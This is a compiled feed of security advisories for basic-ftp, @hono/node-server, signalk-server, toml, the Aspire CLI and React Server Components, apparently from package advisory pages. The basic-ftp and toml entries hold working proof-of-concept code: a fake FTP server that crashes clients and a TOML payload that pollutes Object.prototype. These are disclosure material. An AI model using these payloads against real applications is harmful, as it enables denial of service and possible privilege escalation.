Affected versions

PackageVulnerable versionsPatched version
basic-ftp <= 6.2.3 6.2.4

Summary

basic-ftp's MLSD directory-listing parser (src/parseListMLSD.ts) looks up fact-handler functions in a plain object literal keyed directly by fact names taken from the FTP server's response, with no validation. A directory-listing line containing the fact name "proto" resolves this lookup to Object.prototype (inherited, non-own, non-function) instead of undefined, so the "not a function" guard is bypassed and the code throws TypeError: factHandler is not a function.

This TypeError is not an FTPError, so it is not caught by Client.list()'s retry logic and propagates as a rejected promise out of list() and every API built on top of it (list, downloadToDir, uploadFromDir, clearWorkingDir, removeDir). Any FTP server the client connects to — or any on-path attacker on a plaintext (non-TLS) FTP session — can crash the calling application by returning one crafted line in a directory listing. If the application does not wrap every one of these calls in try/catch, the rejection is unhandled and crashes the Node.js process (default behavior since Node 15).

Details

File: src/parseListMLSD.ts

const factHandlersByName: {[key: string]: FactHandler} = {
    "size": parseSize,
    "sizd": parseSize,
    "unique": (value, info) => { info.uniqueID = value },
    "modify": (value, info) => { ... },
    "type": (value, info) => { ... },
    "unix.mode": (value, info) => { ... },
    ...
}

export function parseLine(line: string): FileInfo | undefined {
    const [ packedFacts, name ] = splitStringOnce(line, " ")
    ...
    const facts = packedFacts.split(";")
    for (const fact of facts) {
        const [ factName, factValue ] = splitStringOnce(fact, "=")
        if (!factValue) { continue }
        const factHandler = factHandlersByName[factName.toLowerCase()]   // <-- unsafe lookup
        if (!factHandler) { continue }
        const result = factHandler(factValue, info)                     // <-- throws here
        ...
    }
    return info
}

factHandlersByName is a plain {} object literal, so it inherits from Object.prototype. Property access does not distinguish own keys from inherited ones. When factName.toLowerCase() === "proto", the bracket lookup factHandlersByName["proto"] returns Object.prototype itself — a truthy, non-undefined value — so the if (!factHandler) continue guard does not fire. The code then tries to call Object.prototype as a function: factHandler(factValue, info), which throws TypeError: factHandler is not a function.

This line runs inside parseList() (src/parseList.ts), called synchronously from a .map() over every line of the listing, which in turn is called from Client._requestListWithCommand() -> Client.list() (src/Client.ts). list()'s only error handling is:

    catch (err) {
        const shouldTryNext = err instanceof FTPError
        if (!shouldTryNext) { throw err }
        lastError = err
    }

A plain TypeError is not an FTPError, so it is immediately rethrown instead of being retried or suppressed, and the Promise returned by list() rejects with it.

Affected call paths (all eventually call Client.list()):

  • Client.list()
  • Client.downloadToDir() / _downloadFromWorkingDir()
  • Client.clearWorkingDir()
  • Client.removeDir()

Only "proto" triggers the crash this way; other reserved Object.prototype property names tested ("constructor", "toString", "hasOwnProperty", "valueOf", "defineGetter") happen to resolve to actual functions on Object.prototype, so they are called without throwing (silently ineffective, not a crash). This confirms the root cause is the use of an unguarded object literal as a dictionary keyed by untrusted server input, rather than something specific to one property.

Proof of concept

Prerequisites: Node.js, a clone/checkout of basic-ftp, npm install then npm run buildOnly (or npx tsc) to produce dist/.

Step 1 — Minimal reproduction of the parser bug alone:

node -e '
const { parseList } = require("./dist/parseList");
parseList("__proto__=x;type=file;size=10; evil.txt");
'

Expected result: Uncaught TypeError: factHandler is not a function at parseLine (.../dist/parseListMLSD.js:...)

Step 2 — End-to-end reproduction through the public Client API, proving a real FTP server can trigger this over the wire with no client modification:

Save as poc.js in the repo root and run `node poc.js`:

const net = require("net")
const { Client } = require("./dist/index")

const server = net.createServer(socket => {
    socket.write("220 fake ftp ready\r\n")
    socket.on("data", data => {
        const cmd = data.toString().trim()
        if (cmd.startsWith("USER")) socket.write("230 ok\r\n")
        else if (cmd.startsWith("OPTS") || cmd.startsWith("TYPE") ||
                 cmd.startsWith("STRU") || cmd.startsWith("PBSZ") ||
                 cmd.startsWith("PROT")) socket.write("200 ok\r\n")
        else if (cmd.startsWith("FEAT")) socket.write("211-Features\r\n MLST type;size;\r\n211 End\r\n")
        else if (cmd.startsWith("EPSV")) {
            const dataServer = net.createServer(dsock => {
                // The malicious line: fact name "__proto__"
                dsock.end("__proto__=pwn;type=file;size=4; evil.txt\r\n")
            })
            dataServer.listen(0, "127.0.0.1", () => {
                const p = dataServer.address().port
                socket.write(`229 Entering Extended Passive Mode (|||${p}|)\r\n`)
            })
        }
        else if (cmd.startsWith("MLSD") || cmd.startsWith("LIST")) {
            socket.write("150 Here comes the listing\r\n")
            setTimeout(() => socket.write("226 Listing complete\r\n"), 50)
        }
        else socket.write("200 ok\r\n")
    })
})

server.listen(2121, "127.0.0.1", async () => {
    const client = new Client()
    try {
        await client.access({ host: "127.0.0.1", port: 2121, user: "a", password: "b" })
        const files = await client.list()
        console.log("list() returned normally (unexpected):", files)
    } catch (err) {
        console.log("client.list() threw:", err.constructor.name, "-", err.message)
    } finally {
        client.close()
        server.close()
        process.exit(0)
    }
})

Expected output:

client.list() threw: TypeError - factHandler is not a function

Configuration notes:

  • No TLS, auth bypass, or special server config needed — this is a plain FTP (PASV/EPSV text) session using the server's FEAT response to turn on MLSD, which is the common path for any modern FTP server.
  • The same crash can be delivered via a LIST-fallback MLSD-shaped line too, since parseList() auto-detects the format from the last listing line.
  • In a real application without a try/catch around list()/downloadToDir()/ clearWorkingDir()/removeDir(), this rejection is unhandled and terminates the Node.js process by default (Node >=15 unhandledRejection behavior is "throw").

Impact

Type: Denial of Service (CWE-248: Uncaught Exception, enabled by CWE-1321-style unguarded dictionary lookup on an object literal).

Who is impacted: Any application using basic-ftp's Client.list(), downloadToDir(), uploadFromDir() (via ensureDir/clearWorkingDir paths), clearWorkingDir(), or removeDir() against a server that is malicious, compromised, or reachable by an on-path attacker on a non-TLS FTP session. No authentication to the target server is required beyond whatever credentials the application already uses, and no user interaction is required — a single crafted directory-listing line is sufficient.

Confidentiality: None. Integrity: None. Availability: High — unhandled rejection crashes the Node.js process by default, taking down the whole application/service, not just the FTP operation.

References

  • https://github.com/patrickjuchli/basic-ftp/security/advisories/GHSA-5pm8-86m8-9m6r
  • https://github.com/patrickjuchli/basic-ftp/commit/a22664a45d889f7d281e5bdd212c68c0a58d0ae6
  • https://github.com/patrickjuchli/basic-ftp/releases/tag/v6.2.4
  • https://github.com/advisories/GHSA-5pm8-86m8-9m6r

Affected versions

PackageVulnerable versionsPatched version
@hono/node-server >= 2.0.0, < 2.1.6 2.1.6

Summary

While @hono/node-server waits for the Hono application to handle a WebSocket upgrade request, the socket has no error listener. If the client resets the TCP connection during that time, the resulting ECONNRESET is emitted as an unhandled 'error' event and the process terminates.

Details

The upgrade handler awaits the application before attaching any listener to the socket. When middleware on the upgrade path does asynchronous work, such as an authentication lookup, a connection reset in that window has no handler. If a global uncaughtException handler swallows the error, the pending upgrade is never released and its entry is retained for the lifetime of the process.

The fix attaches error and close listeners to the socket before calling the application, releases the pending upgrade when the socket closes, and skips the handshake on a destroyed socket.

Impact

An unauthenticated client can terminate the server process with a single connection by sending a WebSocket upgrade request and resetting the connection before the application has responded. Where the crash is suppressed, repeated requests grow the heap.

This affects applications that enable WebSocket support in @hono/node-server and run asynchronous middleware or handlers on the upgrade path.

Affected versions

PackageVulnerable versionsPatched version
@hono/node-server < 1.19.18 1.19.18

Summary

@hono/node-server passes the raw request-target to the WHATWG URL parser, which treats a backslash in the path as / and then resolves .. segments. A request for /admin\secret or /public\..\admin/secret reaches the application as /admin/secret. A reverse proxy that follows RFC 3986 forwards the backslash unchanged and applies its path-based rules to the original path, so the request reaches a route the proxy is meant to block.

Details

A raw backslash is not allowed in a request-target (RFC 3986, RFC 9112 Section 3.2.1), and RFC 9112 Section 3.2 says a recipient should reject such a request rather than correct it. Proxies such as nginx on Linux, HAProxy and Envoy keep the backslash as an ordinary character, so they and the application see different paths.

The fix responds with 400 Bad Request to a request whose path contains a raw backslash, for HTTP/1.1, HTTP/2, absolute-form request-targets and WebSocket upgrades. A percent-encoded backslash and a backslash in the query string are still accepted.

Impact

An unauthenticated client can reach a route that a reverse proxy, load balancer or WAF in front of the application blocks by path.

This affects applications served by @hono/node-server behind a front component that makes path-based decisions and forwards a backslash unchanged. Access control inside the Hono application, such as middleware on /admin/*, runs on the rewritten path and is not affected.

Affected versions

PackageVulnerable versionsPatched version
signalk-server < 2.31.0-beta.1 2.31.0-beta.1

Summary

An unauthenticated WebSocket client can subscribe to the log path and receive buffered server logs.

WebSocket connections are intentionally permitted before authentication because login occurs over the WebSocket connection. However, the log subscription path does not enforce an authorization check.

processSubscribe handles subscriptions to the log path separately, without applying access control:

if (
  Array.isArray(msg.subscribe) &&
  msg.subscribe.length > 0 &&
  msg.subscribe[0].path === 'log'
) {
  if (!spark.logUnsubscribe) {
    spark.logUnsubscribe = startServerLog(app, spark)
  }
} else {
  // normal subscriptions go through subscriptionmanager, which applies
  // securityStrategy.filterReadDelta
}

startServerLog then replays the whole buffer to that socket:

app.logging.getLog().forEach((log) => {
  spark.write({ type: 'LOG', data: log })
})

The asymmetry is inside this one file. Writes are gated by securityStrategy.shouldAllowWrite (ws.ts:961), normal delta subscriptions are filtered by securityStrategy.filterReadDelta (ws.ts:1159, the else branch of this same function), and the log branch consults neither.

An unauthenticated socket, which is legitimately open for login, can subscribe to log and receive buffered server logs.

Fix: Requires an administrator principal, before startServerLog, in the same way the other branch defers to securityStrategy. The fix was released with version 2.31.0-beta.1.

The investigated code path was reviewed at commit 26ab199. No server was run and no WebSocket frames were captured. AI assistance was used during the investigation.

Affected versions

PackageVulnerable versionsPatched version
toml <= 5.0.0 5.0.1

Summary

CVE-2026-63376 described prototype pollution through proto key-path desynchronization and was fixed in 4.1.2 by rewriting the path bookkeeping and adding an ownedContainers WeakSet. The desynchronization is still reachable, spelled with a quote character instead of a dot, and the owned-container check is not applied on the path that matters.

A four-line TOML document parsed with toml.parse() writes a property onto Object.prototype, where it is visible to every object in the process — including objects produced by unrelated libraries.

Details

Three gaps compose. All line numbers are lib/compiler.js in 5.0.0.

1. The path-key encoding is ambiguous. quoteDottedString() quotes a segment only when it contains a ., and never escapes a " inside the segment:

287:  function quoteDottedString(str) {
288:    if (str.indexOf(".") > -1) {
289:      return "\"" + str + "\"";
290:    } else {
291:      return str;
292:    }
293:  }

So the key path ['x.y'] and the key path ['"x', 'y"'] both render as the string "x.y". This is the same desynchronization CVE-2026-63376 named, with a quote in place of the dot.

2. A table-array header can clear another key's guard. addTableArray() walks assignedPaths / valueAssignments with isSameOrSubPath() over those ambiguous strings, so a header whose rendered path collides with an unrelated key deletes that key's entry.

3. The descent in assign() has no owned-container check. deepRef() applies isOwnedContainer() only to intermediate segments (lib/compiler.js:265, :273) and returns the final container unchecked. assign() then walks it with only a shape test:

 93:      target = target[k];
...
103:    target[lastKey] = reduced;

A TOML datetime is a Date. It satisfies typeof target[k] === "object" and is not an array, so the walk descends into it — and a Date has a live prototype chain to Object.prototype.

Putting the three together, a document can make the current table a Date and then walk __proto__.__proto__ to Object.prototype.

mkdir poc && cd poc && npm init -y >/dev/null && npm install toml@5.0.0

# poc.toml
"b.c" = 1979-05-27T07:32:00Z
[['"b']]
["b.c"]
__proto__.__proto__.polluted = "yes"

Line 1 defines a key whose rendered path is "b.c" and whose value is a Date. Line 2 is a table-array header whose rendered path collides with it, clearing its guard. Line 3 re-enters that key, so the current table is now the Date. Line 4 walks Date → Date.prototype → Object.prototype.

// poc.js
const toml = require('toml');
const fs = require('fs');

console.log('before:', JSON.stringify(({}).polluted));
toml.parse(fs.readFileSync('poc.toml', 'utf8'));
console.log('after: ', JSON.stringify(({}).polluted));
console.log('Object.prototype.hasOwnProperty("polluted") =', Object.prototype.hasOwnProperty('polluted'));
console.log('JSON.parse("{}").polluted =', JSON.stringify(JSON.parse('{}').polluted));

$ node poc.js
before: undefined
after:  "yes"
Object.prototype.hasOwnProperty("polluted") = true
JSON.parse("{}").polluted = "yes"

The payload sets a single harmless marker property. The last line shows the property is visible on an object this code never touched.

A useful control: the same document without line 2 (the guard-clearing header) is correctly rejected on 4.1.2 and later, which confirms the clearing step is what is load-bearing.

Impact

Any application that parses a TOML document from an untrusted source is affected — a configuration file uploaded by a user, a manifest from a third-party package or repository, a document posted to an API. Prototype pollution of this kind commonly escalates to authentication or authorization bypass, denial of service, and in applications with a suitable gadget, remote code execution, because every object in the process inherits the injected property.

Suggested fix: in assign(), apply the same check the intermediate descent already uses — after target = target[k], reject when !isOwnedContainer(target). Equivalently, apply isOwnedContainer to the value deepRef() returns. Separately, quoteDottedString() should escape " inside a segment so that distinct key paths cannot render to the same string.

References

  • https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-h895-cgqg-jf52
  • https://nvd.nist.gov/vuln/detail/CVE-2026-114142
  • https://github.com/BinaryMuse/toml-node/commit/609c873fffea0a27ebe5b4dd098eed2b3daf3606
  • https://github.com/BinaryMuse/toml-node/releases/tag/v5.0.1
  • https://github.com/advisories/GHSA-h895-cgqg-jf52

Executive summary

Microsoft is releasing this security advisory to provide information about a vulnerability in the Aspire CLI. This advisory provides guidance on updating affected applications and components.

Insecure temporary files used by Aspire CLI can allow a local attacker to obtain sensitive configuration information.

Announcement

Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/518

CVSS Details

  • Version: 3.1
  • Severity: High
  • Score: 7.3
  • Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:L
  • Weakness: CWE-532 (Insertion of Sensitive Information into Log File)
  • MSRC severity: Important
  • Impact: Information Disclosure

Affected Platforms

  • Platforms: Linux, macOS
  • Architectures: x64, Arm64

Affected Packages

Standalone Aspire CLI

Aspire CLI (Aspire.Cli) >= 13.2.0, < 13.6.5 13.6.5
Aspire.Cli.linux-x64 >= 13.3.0, < 13.6.5 13.6.5

@microsoft/aspire-cli-osx-arm64 >= 13.4.2, < 13.6.5 13.6.5

The affected component is the Aspire CLI's deprecated MCP configuration scanner, which ships in the CLI packages listed above. Its temporary-file diagnostics can include configuration content and use a fixed path in a shared temporary directory.

Advisory FAQ

How do I know if I am affected?

The reported scenario involves running Aspire CLI agent or MCP initialization commands on a non-Windows system with a temporary directory shared by multiple users. Versions 13.2.0 through 13.6.4 are affected.

Aspire ships independently of .NET. Installing a .NET runtime or SDK update does not establish that the affected Aspire CLI has been updated.

How do I fix the issue?

Update the Aspire CLI to version 13.6.5 or later. If installed as a .NET tool, update the Aspire.Cli package. If installed using npm, update @microsoft/aspire-cli to version 13.6.5 or later; its platform-specific dependency must also resolve to version 13.6.5 or later. Otherwise update the CLI through its installation method.

Reporting Security Issues

If you have found a potential security issue in a supported version of .NET, please report it to the Microsoft Security Response Center (MSRC) via the MSRC Researcher Portal. Further information can be found in the MSRC Report an Issue FAQ.

Security reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty.

items.content_html:
Affected versions

PackageVulnerable versionsPatched version
react-server-dom-webpack >= 19.3.0, < 19.3.1 19.3.1

Impact

Crafted payloads targeting frameworks supporting React Server Components can lead to remote code execution. This only affects extremely rare cases where responses transport multiple typed arrays and an attacker-controlled value.

Updating immediately is recommended.

The vulnerability exists in versions 19.0.0 through 19.0.8, 19.1.0 through 19.1.9, 19.2.0 through 19.2.8 and 19.3.0 of:

  • react-server-dom-webpack
  • react-server-dom-parcel
  • react-server-dom-turbopack

Patches

Fixes were back ported to versions 19.0.09, 19.1.10, 19.2.9, and 19.3.1.

If applications are using any of the above packages please upgrade to any of the fixed versions immediately.

If an app’s React code does not use a server, the app is not affected by this vulnerability. If an app does not use a framework, bundler, or bundler plugin that supports React Server Components, the app is not affected by this vulnerability.
